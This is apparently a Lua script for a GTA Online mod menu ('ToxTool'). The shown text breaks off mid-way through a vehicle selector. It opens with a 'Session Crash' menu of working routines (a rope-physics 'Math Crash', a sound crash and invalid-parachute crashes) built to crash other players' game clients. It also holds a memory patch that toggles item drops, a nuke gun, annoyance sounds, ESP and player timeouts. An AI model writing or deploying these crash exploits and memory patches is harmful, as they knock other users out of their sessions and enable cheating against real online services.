require("ToxTool")
guidedMissile = require("guided_missile")

local Sescrashes = menu.list(menu.my_root(), "Session Crash")

local Self_root = menu.list(menu.my_root(), "Self")
local Screen_effects = menu.list(Self_root, "Screen effects")
local Actions = menu.list(Self_root, "Actions")
local fire_wings_list = menu.list(Self_root, "Fire wings")

--[[local online = menu.list(menu.my_root(), "Online")]]--

local Veh_root = menu.list(menu.my_root(), "Vehicle")
 speedmetter_menu = menu.list(Veh_root, "SpeedMetter")
local drift_mod =  menu.list(Veh_root, "Drift mod")
local Tvehicle = menu.list(Veh_root, "Vehicle Fly")
local nearbyentities = menu.list(Veh_root, "Nearby entities")
local trailer_menu = menu.list(Veh_root, "Trailer Mod")

local Misc_root = menu.list(menu.my_root(), "Online")
local orbitalfunc = menu.list(Misc_root, "Orbital function")
local soundsList = menu.list(Misc_root, "Sounds")
local esp = menu.list(Misc_root, "ESP")
local bowling = menu.list(Misc_root, "Bowling")
local proximities = menu.list(esp, "Color Settings, Proximities", {"catprox"}, "Settings for the proximity colors.")
local espenables = menu.list(esp, "ESP Settings/Enabled", {"catenabled"}, "Settings for which ESP is enabled, settings.")

 menyoo_root = menu.list(menu.my_root(), "Menyoo XML\'s", {"menyoo"}, "Menyoo support!")
 menyoovmain_root = menu.list(menyoo_root, "Vehicles", {"menyoovehicles"}, "Menyoo vehicle support!")
 menyoom1_root = menu.list(menyoo_root, "Maps", {"menyoomapsroot"}, "Menyoo maps support!")
 menyoom_root = menu.list(menyoom1_root, "Maps", {"menyooallmaps"}, "All maps in your directory")
 menyoomloaded_root = menu.list(menyoom1_root, "Currently loaded maps", {"menyooloadedmaps"}, "Maps you have loaded")
 menyoov_root = menu.list(menyoovmain_root, "All vehicles", {"menyooloadedmaps"}, "Vehicles you have spawned")
 menyoovloaded_root = menu.list(menyoovmain_root, "Currently loaded vehicles", {"menyooloadedmaps"}, "Vehicles you have spawned")

 --[[local dmg = menu.list(Misc_root, "Show dmg")
 local damage_numbers_colours_list = menu.list(dmg, "colour settings")]]--
 local host_tools_list = menu.list(Misc_root, "Host Tools")

--         _____ ________________ ________  _   __
--        / ___// ____/ ___/ ___//  _/ __ \/ | / /
--        \__ \/ __/  \__ \\__ \ / // / / /  |/ / 
--       ___/ / /___ ___/ /__/ // // /_/ / /|  /  
--      /____/_____//____/____/___/\____/_/ |_/   

--         __________  ___   _____ __  _____________ __  __
--        / ____/ __ \/   | / ___// / / / ____/ ___// / / /
--       / /   / /_/ / /| | \__ \/ /_/ / __/  \__ \/ /_/ / 
--      / /___/ _, _/ ___ |___/ / __  / /___ ___/ / __  /  
--      \____/_/ |_/_/  |_/____/_/ /_/_____//____/_/ /_/   

local include_friends = false
menu.toggle(Sescrashes, "Exclude friends", {"timeoutfriends"}, "Turn off sync with friends", function(on)
    include_friends = on
    for k, id in pairs(players.list(false, true, false)) do
        name = players.get_name(id)
        if include_friends then
            trigger_command("timeout"..name.." on")
        else
            trigger_command("timeout"..name.." off")
        end
    end
end, false)

menu.action(Sescrashes, "Math Crash", {}, "One of the versions of rop crash.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    cargobob = entities.create_vehicle(2132890591, pos, 0)
    cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
end)

----------------------------------------
-- Sound Crash
----------------------------------------

menu.action(Sescrashes, "Sound Crash", {"SCrash", "SCrashall"}, "does not work for those who are in the interior.", function ()
    local name = players.get_name(players.user())
    trigger_command("kstopall")
    wait(30)
    trigger_command("ksounds5s" .. name)
    wait(50)
trigger_command("bealone")
    wait(50)
trigger_command("kstopall")
    util.toast("Ready") 
end)

-------------------------------------
-- Invalid Parachute
-------------------------------------
    
menu.action(Sescrashes, "Invalid Parachut", {"parcrash"}, "", function()
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    trigger_command("anticrashcamera on")
    local a=joaat("prop_flag_sheriff")
    while not STREAMING.HAS_MODEL_LOADED(a) do 
        STREAMING.REQUEST_MODEL(a)
        wait()
    end
    for q=1,10 do 
        while not STREAMING.HAS_MODEL_LOADED(941494461) do 
            STREAMING.REQUEST_MODEL(941494461)
            wait()
        end
        local G=players.user()
        local H=PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(G)
        local I=ENTITY.GET_ENTITY_COORDS(H,true)
        local J=ENTITY.GET_ENTITY_COORDS(H,true)
        J.x=-836+math.random(-2000, 2000)
        J.y=1548+math.random(-2000, 2000)
        J.z=1000+math.random(80)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(H,J.x,J.y,J.z,0,0,1)
        local K=entities.create_vehicle(941494461,J,0)
        ENTITY.SET_ENTITY_VISIBLE(K,false,false)
        PED.SET_PED_INTO_VEHICLE(H,K,-1)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(K,a)
        wait(111)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(K,true)
        wait(222)
        entities.delete(K)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
    trigger_command("anticrashcamera off") 
    toast("Ready")
end)

menu.action(Sescrashes, "Player Invalid Parachute", {"pcrash", "Pcrashall"}, "Crash Timing Parachute -> An object.", function()
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
trigger_command("anticrashcamera on")
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 446.9146, 5571.7847, 781.1893)
    wait(250)
    for i=1,4  do
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -598185919)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, pos.x, pos.y, 120.0)
        wait(400)
	    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 1360563376)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -8000.0, 15999.0, 1337.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -1842599357)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 8000.0, 15999.0, 228.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -2071359746)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -15999, 8000.0, 1488.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 1269906701)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 15980, 8000.0, 2511.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -717142483)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 0.0, 0.0, 3333.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 516221692)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 228.0, 1337.0, 300.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 2147205602)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1488.0, 2511.0, 500.0)
        wait(400)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -1442454769)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1488, 228.0, 100.0)
        wait(400)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
    PLAYER.CLEAR_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_ped)
trigger_command("anticrashcamera off")
    toast("Ready")
end)


-------------------------------------
-- Crash Legal Model
-------------------------------------


--          _____    ______   __       ______
--         / ___/   / ____/  / /      / ____/
--         \__ \   / __/    / /      / /_    
--        ___/ /  / /___   / /___   / __/    
--       /____/  /_____/  /_____/  /_/ 

----------------------------------------
--Fire Wings
----------------------------------------

local fireWings = {
    [1] = {pos = {[1] = 140, [2] =  75}},
    [2] = {pos = {[1] = 140, [2] = -75}},
    [3] = {pos = {[1] = 150, [2] =  75}},
    [4] = {pos = {[1] = 150, [2] = -75}},
    [5] = {pos = {[1] = 160, [2] =  75}},
    [6] = {pos = {[1] = 160, [2] = -75}},
    [7] = {pos = {[1] = 170, [2] =  75}},
    [8] = {pos = {[1] = 170, [2] = -75}},
}
local fireWingsSettings = {
    scale = 0.3,
    fireColour = new.colour(255 / 255, 127 / 255, 80 / 255, 1),
    on = false
}
local ptfxEgg
local firewingPtfx = 'muz_xs_turret_flamethrower_looping'
menu.toggle(fire_wings_list, 'Fire wings', {'ToxfireWings'}, 'Put the wings on your back.', function (toggle)
    fireWingsSettings.on = toggle
    if fireWingsSettings.on then
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
        if ptfxEgg == nil then
            local eggHash = 1803116220
            requestModels(eggHash)
            ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
            ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
        end
        for i = 1, #fireWings do
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                wait()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(firewingPtfx, ptfxEgg, 0, -0.15, 0.3, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)
            util.create_tick_handler(function()
                local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                for i = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.fireColour.r, fireWingsSettings.fireColour.g, fireWingsSettings.fireColour.b)
                end

                ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                return fireWingsSettings.on
            end)
        end
    else
        for i = 1, #fireWings do
            if fireWings[i].ptfx then
                GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                fireWings[i].ptfx = nil
            end
            if ptfxEgg then
                entities.delete_by_handle(ptfxEgg)
                ptfxEgg = nil
            end
        end
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end) 

menu.slider(fire_wings_list, 'Fire wings scale', {'ToxfireWingsScale'}, '', 1, 100, 3, 1, function(value)
    fireWingsSettings.scale = value / 10
end)

menu.rainbow(menu.colour(fire_wings_list, "Fire wings colour", {'ToxfireWingsColour'}, '', fireWingsSettings.fireColour, false, function(colour)
    fireWingsSettings.fireColour = colour
end))

----------------------------------------
--Screen Effects
----------------------------------------

for name, state in pairs(screen_effects) do
    menu.toggle(Screen_effects, name, {name}, "", function(on_toggle)
        state = on_toggle
		if state then
			GRAPHICS.ANIMPOSTFX_PLAY(name, 300000, true)
		else
			GRAPHICS.ANIMPOSTFX_STOP(name)
		end
    end, false)
end
----------------------------------------
-- Actions
----------------------------------------

menu.action(Actions, "Stop all Actions", {"Stopallactions"}, "", function() EmoteCancel() end)
menu.action(Actions, "Random Dance", {}, "", function() playDance(math.random(1, 3969)) end)
local emotes = menu.list(Actions, "Emotes")
local emotesProps = menu.list(Actions, "EmotesProps")
local dances = menu.list(Actions, "Dances")
local Naughty = menu.list(Actions, "Naughty")
local scenarios = menu.list(Actions, "Scenarios")

for k,_ in spairs(DP.Emotes, function(t, a, b) return t[a][3] < t[b][3] end) do 
    menu.action(emotes, k, {k}, "",function() return OnEmotePlay(_) end)
end
for k,_ in spairs(DP.PropEmotes, function(t, a, b) return t[a][3] < t[b][3] end) do 
    menu.action(emotesProps, k, {k}, "", function() return OnEmotePlay(_) end)
end
  
for k,_ in spairs(DP.Dances, function(t, a, b) return t[a][3] < t[b][3] end) do 
    menu.action(dances, k, {k}, "", function() return OnEmotePlay(_) end)
end

for k,_ in spairs(DP.Naughty, function(t, a, b) return t[a][3] < t[b][3] end) do 
    menu.action(Naughty, k, {k}, "", function() return OnEmotePlay(_) end)
end
for i=1,#Scenarios do
    menu.action(scenarios, Scenarios[i][2], {}, "", function()
        TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), Scenarios[i][1], 0, true)
        IsInScenarios = true
    end)
end

------------------------------------
--Nuke
------------------------------------

 function raycast_gameplay_cam(flag, distance)
        local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
        local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
        local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
        local direction = v3.toDir(cam_rot)
        local destination =
        {
            x = cam_pos.x + direction.x * distance,
            y = cam_pos.y + direction.y * distance,
            z = cam_pos.z + direction.z * distance
        }
        SHAPETEST.GET_SHAPE_TEST_RESULT(
            SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
                cam_pos.x,
                cam_pos.y,
                cam_pos.z,
                destination.x,
                destination.y,
                destination.z,
                flag,
                -1,
                1
            ), ptr1, ptr2, ptr3, ptr4)
        local p1 = memory.read_int(ptr1)
        local p2 = memory.read_vector3(ptr2)
        local p3 = memory.read_vector3(ptr3)
        local p4 = memory.read_int(ptr4)
        return {p1, p2, p3, p4}
    end

function direction()
        local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
        local res = raycast_gameplay_cam(-1, 1000)
        local c2

        if res[1] != 0 then
            c2 = res[2]
        else
            c2 = get_offset_from_gameplay_camera(1000)
        end

        c2.x = (c2.x - c1.x) * 1000
        c2.y = (c2.y - c1.y) * 1000
        c2.z = (c2.z - c1.z) * 1000
        return c2, c1
    end

  local remove_projectiles = false
    local function disableProjectileLoop(projectile)
        util.create_thread(function()
            util.create_tick_handler(function()
                WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
                return remove_projectiles
            end)
        end)
    end

    local exp_animal_toggle --so options above it have access to the toggle option

local nuke_running = false
    local grenade_running = false
    local animals_running = false

    local nuke_height = 40
    local function executeNuke(pos)
        for a = 0, nuke_height, 4 do
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
            util.yield(50)
        end
        FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
        FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
        FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
        FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    end

    --credit to lance for the entity gun, but i edited it a bit
    local nuke_gun_root = menu.list(Self_root, 'Nuke options', {}, '')
    local nuke_gun_toggle = menu.toggle(nuke_gun_root, 'Nuke gun', {'nukeGun'}, 'Upgrade RPG grenade then atomic bomb', function(toggle)
        nuke_running = toggle
        if nuke_running then
            if animals_running then menu.trigger_command(exp_animal_toggle, 'off') end
            util.create_tick_handler(function()
                if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
                    if PED.IS_PED_SHOOTING(players.user_ped()) then
                        if not remove_projectiles then
                            remove_projectiles = true
                            disableProjectileLoop(-1312131151)
                        end
                        util.create_thread(function()
                            local hash = util.joaat('w_arena_airmissile_01a')
                            STREAMING.REQUEST_MODEL(hash)
                            local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                            local dir, pos = direction()
                            local bomb = entities.create_object(hash, pos)
                            ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                            ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                            while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                            local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                            entities.delete(bomb)
                            executeNuke(nukePos)
                        end)
                    else
                        remove_projectiles = false
                    end
                else
                    remove_projectiles = false
                end
                return nuke_running
            end)
        end
    end)

    
    local function get_waypoint_pos2()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            return waypoint_pos
        else
            toast('No waypoint set.')
        end
    end

    menu.action(nuke_gun_root, 'Nuke waypoint', {'nukeWP'}, 'Drop the bomb on the specified point on the map.', function()
        local waypointPos = get_waypoint_pos2()
        if waypointPos then
            local hash = util.joaat('w_arena_airmissile_01a')
            STREAMING.REQUEST_MODEL(hash)
            waypointPos.z += 30
            local bomb = entities.create_object(hash, waypointPos)
            waypointPos.z -= 30
            ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
            entities.delete(bomb)
            executeNuke(waypointPos)
        end
    end)
    menu.slider(nuke_gun_root, 'Nuke height', {'nukeHeight'}, 'mushroom height.', 10, 100, nuke_height, 10, function(value)
        nuke_height = value
    end)



-------------------------------------
--Thermal
-------------------------------------
    local thermal_command = menu.ref_by_path('Game>Rendering>Thermal Vision', 34)
    menu.toggle_loop(Self_root, 'Thermal guns', {'thermalGuns'}, 'Activation of the thermal imager by pressing "E" when you aim.', function()
        if PLAYER.IS_PLAYER_FREE_AIMING(players.user_ped()) then
            if PAD.IS_CONTROL_JUST_PRESSED(2, 38) then
                if not GRAPHICS.GET_USINGSEETHROUGH() then
                    menu.trigger_command(thermal_command, 'on')
                    GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(50)
                else
                    menu.trigger_command(thermal_command, 'off')
                    GRAPHICS.SET_SEETHROUGH(false)
                    GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(1) --default value is 1
                end
            end
        elseif GRAPHICS.GET_USINGSEETHROUGH() then
            menu.trigger_command(thermal_command, 'off')
            GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(1)
        end
    end)

-------------------------------------
-- Passive
-------------------------------------

--[[menu.toggle(Self_root, "Passive", {"pas"}, "", function(toggle)
    if toggle then
        SET_INT_GLOBAL(262145 + 26853, 1) -- 266828370
    else
   SET_INT_GLOBAL(262145 + 26854, 1 ) -- 266828370
    end 
end)]]--

-------------------------------------
-- SUPERPUNCH
-------------------------------------

menu.toggle(Self_root, "Superpunch", {"superpunches"}, "", function(toggle)
    if toggle then
        trigger_command("damagemultiplier 10000")
    else
    trigger_command("damagemultiplier 1.01")
    trigger_command("damagemultiplier 1")
    end 
end)


-------------------------------------
-- Drop
-------------------------------------

local addr = memory.scan("48 81 EC ? ? ? ? 48 8B E9 48 8B CA 0F 29 74 24 ? 48 8B DA") - 0x15
local originalBytes = memory.read_uint(addr)
menu.toggle(Self_root, "Dropack", {"Drpack"}, "", function(toggle)
    if toggle then
        memory.write_uint(addr, 2428703408)
    else
        memory.write_uint(addr, originalBytes)
    end 
end)

local originalBytes = memory.read_uint(addr)
menu.toggle(Self_root, "Droaq", {"Dropaq"}, "", function(toggle)
    if toggle then
        memory.write_uint(addr, 2428703920)
    else
        memory.write_uint(addr, originalBytes)
    end 
end)




-------------------------------------
-- VALKYIRE ROCKET
-------------------------------------

menu.toggle(Self_root, "Upgrade firewerk launcher to ATGM", {"ATGM"}, "Firework upgrade to guided anti-tank missile", function(toggle)
	gUsingValkRocket = toggle
	if gUsingValkRocket then
		local rocket
		local cam
		local blip
		local init
		local draw_rect = function(x, y, z, w)
			GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255)
		end

		while gUsingValkRocket do
			if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) and WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 2138347493 and not init then
				init = true 
				sTime = cTime()
			elseif init then
				if not ENTITY.DOES_ENTITY_EXIST(rocket) then
					local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID())
					local offset = getOffsetFromCam(10)
			
					rocket = OBJECT.CREATE_OBJECT_NO_OFFSET(util.joaat("w_lr_rpg_rocket"), offset.x, offset.y, offset.z, true, false, true)
					ENTITY.SET_ENTITY_INVINCIBLE(rocket, true)
					ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(rocket, true)
					ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(rocket, true, 1)
					NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.OBJ_TO_NET(rocket), true);
					NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.OBJ_TO_NET(rocket), false)
					ENTITY.SET_ENTITY_RECORDS_COLLISIONS(rocket, true)
					ENTITY.SET_ENTITY_HAS_GRAVITY(rocket, false)
				
					CAM.DESTROY_ALL_CAMS(true)
					cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
					CAM.SET_CAM_NEAR_CLIP(cam, 0.01)
					CAM.SET_CAM_NEAR_DOF(cam, 0.01)
					GRAPHICS.CLEAR_TIMECYCLE_MODIFIER()
					GRAPHICS.SET_TIMECYCLE_MODIFIER("CAMERA_secuirity")
					ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION(cam, rocket, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1)
					CAM.SET_CAM_ACTIVE(cam, true)
					CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)

					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
				else
					local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
					local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
					local coords = ENTITY.GET_ENTITY_COORDS(rocket)
					local groundZ = getGroundZ(coords)
					local altitude = math.abs(coords.z - groundZ)
					local force = vect.mult(direction, 25)
					ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, 1)
					STREAMING.SET_FOCUS_POS_AND_VEL(coords.x, coords.y, coords.z, rot.z, rot.y, rot.z)
					
					ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(rocket, 1, force.x, force.y, force.z, false, false, false, false)

					HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
					HUD._HUD_WEAPON_WHEEL_IGNORE_SELECTION()
					
					draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
					draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.050, 0.5, 0.050, 0.002)
					draw_rect(0.5 - 0.050, 0.5, 0.050, 0.002)
					draw_rect(0.5, 0.500 + 0.05, 0.002, 0.05)
					draw_rect(0.5, 0.500 - 0.05, 0.002, 0.05)
					
					local maxTime = 15000 -- ms
					local length = 0.5 - 0.5 * (cTime()-sTime) / maxTime -- timer length
					local perc = length / 0.5
					local color = getBlendedColour(perc) -- timer color
					GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 120)
					GRAPHICS.DRAW_RECT(0.25, 0.75 - length / 2, 0.03, length, color.r, color.g, color.b, color.a)

					if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or length <= 0 then
						local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket)
						FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(),impactCoord.x, impactCoord.y, impactCoord.z, 5, 1.0, true, false, 0.4)
						entities.delete_by_handle(rocket)
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
						GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
						STREAMING.CLEAR_FOCUS()
						CAM.DESTROY_CAM(cam, 1)
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)					
						rocket = 0
						init = false
					end	
				end
			end
			wait()
		end
		
		if rocket and ENTITY.DOES_ENTITY_EXIST(rocket) then
			local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket)
			FIRE.ADD_EXPLOSION(impactCoord.x, impactCoord.y, impactCoord.z, 32, 1.0, true, false, 0.4)
			entities.delete_by_handle(rocket)
			STREAMING.CLEAR_FOCUS()
			CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
			CAM.DESTROY_CAM(cam, 1)
			GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
			ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
			PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
			if HUD.DOES_BLIP_EXIST(blip) then
				util.remove_blip(blip)
			end
			HUD.UNLOCK_MINIMAP_ANGLE()
			HUD.UNLOCK_MINIMAP_POSITION()
		end
	end
end)

----------------------------------------
-- Launch Guided
----------------------------------------

menu.action(Self_root, menuname("Weapon", "Launch Guided Missile"), {"missile"}, "Launch a cruise missile.", function()
	guidedMissile.create()
end)

--          ____     _   __   __       ____   _   __   ______   
--         / __ \   / | / /  / /      /  _/  / | / /  / ____/   
--        / / / /  /  |/ /  / /       / /   /  |/ /  / __/      
--       / /_/ /  / /|  /  / /___   _/ /   / /|  /  / /___      
--       \____/  /_/ |_/  /_____/  /___/  /_/ |_/  /_____/ 


-------------------------------------
-- Sounds
-------------------------------------

menu.action(Misc_root, "Stop Sounds", {"kstopall", "kstopallsounds"}, "Stop the sounds", function ()
    for i=0,99 do
       AUDIO.STOP_SOUND(i)
       wait()
    end
end)

for i = 1, #SoundAnnoy do
    menu.action(soundsList, SoundAnnoy[i][1], {}, "", function()
        local snd, aud
        snd = tostring(SoundAnnoy[i][1])
        aud = tostring(SoundAnnoy[i][2])
        AudioAnnoyance(snd, aud)
    end)
end

--        _    __           __       _            __      
--       | |  / /  ___     / /_     (_)  _____   / /  ___ 
--       | | / /  / _ \   / __ \   / /  / ___/  / /  / _ \
--       | |/ /  /  __/  / / / /  / /  / /__   / /  /  __/
--       |___/   \___/  /_/ /_/  /_/   \___/  /_/   \___/ 

-------------------------------------
--Trailer Mod
-------------------------------------

menu.click_slider(trailer_menu,"Vehicle", {}, "1=Sadler 2=Sadler2 3=tractor2 4=tractor3 5=tampa3 6=barrage 7=barracks2 8=apc 9=halftrack 10=bison2 11=bison3 12=bison 13=insurgent2 14=technical2 15=technical3 16=nightshark 17=insurgent3 18=insurgent 19=technical 20=menacer 21=phantom 22=hauler2 23=phantom2 24=phantom3 25=hauler 26=packer", 1, 26, 1, 1, function(s)
	if s == 1 then
    tveh = -599568815
    elseif s == 2 then
    tveh = 734217681
    elseif s == 3 then
    tveh = -2076478498
    elseif s == 4 then
    tveh = 1445631933
    elseif s == 5 then
    tveh = -1210451983
    elseif s == 6 then
    tveh = -212993243
    elseif s == 7 then
    tveh = 1074326203
    elseif s == 8 then
    tveh = 562680400
    elseif s == 9 then
    tveh = -32236122
    elseif s == 10 then
